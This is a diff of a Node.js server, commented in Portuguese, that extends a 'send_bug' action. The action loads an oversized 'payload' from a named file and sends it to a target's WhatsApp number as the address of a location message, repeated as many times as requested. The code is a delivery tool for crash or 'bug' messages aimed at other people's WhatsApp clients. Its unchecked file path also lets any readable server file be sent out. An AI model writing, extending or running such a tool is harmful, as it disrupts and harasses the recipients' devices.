@@ -141,47 +141,58 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo exclusivo utilizando Módulos .JS com Localização Nativa
+                // Disparo de Localização carregando diretamente o conteúdo bruto dos arquivos .js ou .txt
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const nomeArquivo = extraData.file;
                     const quantidade = parseInt(extraData.amount) || 1;
 
-                    let conteudoPayload = "⚠️ Payload ZRX";
+                    let conteudoPayload = "";
 
                     try {
-                        const nomeModulo = nomeArquivo.replace(/\.js$/, '');
-                        const caminhoAbsoluto = path.join(__dirname, `${nomeModulo}.js`);
+                        let caminhoArquivo = path.join(__dirname, nomeArquivo);
+                        if (!fs.existsSync(caminhoArquivo) && !nomeArquivo.endsWith('.js')) {
+                            caminhoArquivo += '.js';
+                        }
 
-                        if (fs.existsSync(caminhoAbsoluto)) {
-                            // Limpa o cache para recarregar o arquivo do repositório
-                            delete require.cache[require.resolve(`./${nomeModulo}`)];
-                            const modulo = require(`./${nomeModulo}`);
+                        if (fs.existsSync(caminhoArquivo)) {
+                            // Tenta carregar via require (Módulo Node.js)
+                            try {
+                                const nomeModulo = path.basename(caminhoArquivo, '.js');
+                                delete require.cache[require.resolve(`./${nomeModulo}`)];
+                                const modulo = require(`./${nomeModulo}`);
 
-                            if (typeof modulo === 'string') {
-                                conteudoPayload = modulo;
-                            } else if (typeof modulo === 'object' && modulo !== null) {
-                                const chaves = Object.keys(modulo);
-                                if (chaves.length > 0) {
-                                    conteudoPayload = modulo[chaves[0]];
-                                } else if (modulo.default) {
-                                    conteudoPayload = modulo.default;
+                                if (typeof modulo === 'string') {
+                                    conteudoPayload = modulo;
+                                } else if (typeof modulo === 'object' && modulo !== null) {
+                                    const chaves = Object.keys(modulo);
+                                    if (chaves.length > 0) {
+                                        conteudoPayload = modulo[chaves[0]];
+                                    } else if (modulo.default) {
+                                        conteudoPayload = modulo.default;
+                                    }
                                 }
+                            } catch (eRequire) {
+                                // Se falhar o require, lê o texto bruto do arquivo diretamente
+                                conteudoPayload = fs.readFileSync(caminhoArquivo, 'utf8');
                             }
                         } else {
-                            console.error(`Arquivo JS não encontrado no diretório: ${caminhoAbsoluto}`);
+                            console.error(`Arquivo não encontrado: ${caminhoArquivo}`);
                         }
                     } catch (err) {
-                        console.error("Erro ao carregar o módulo JavaScript:", err.message);
+                        console.error("Erro ao carregar o arquivo:", err.message);
                     }
 
-                    // Trata a string para evitar que estoure o limite de caracteres por mensagem de localização
-                    const addressPayload = (typeof conteudoPayload === 'string' && conteudoPayload.length > 35000)
-                        ? conteudoPayload.substring(0, 35000)
+                    if (!conteudoPayload) {
+                        conteudoPayload = "Localização";
+                    }
+
+                    // Limite para evitar estouro da mensagem de localização
+                    const addressPayload = (typeof conteudoPayload === 'string' && conteudoPayload.length > 30000)
+                        ? conteudoPayload.substring(0, 30000)
                         : conteudoPayload;
 
                     for (let i = 0; i < quantidade; i++) {
-                        // Envia como mensagem de Localização Nativa (Gera a caixa do Mapa)
                         await waSock.sendMessage(targetJid, {
                             location: {
                                 degreesLatitude: -23.550520,
@@ -191,12 +202,11 @@ const server = http.createServer(async (req, res) => {
                             }
                         });
                         
-                        // Intervalo seguro de 3,5 segundos para evitar erros de criptografia
                         await delay(3500);
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ sucesso: true, mensagem: `Carga de ${nomeArquivo} disparada ${quantidade} vez(es)!` }));
+                    res.end(JSON.stringify({ sucesso: true, mensagem: `Envio de ${nomeArquivo} realizado (${quantidade}x)!` }));
                     return;
                 }
 
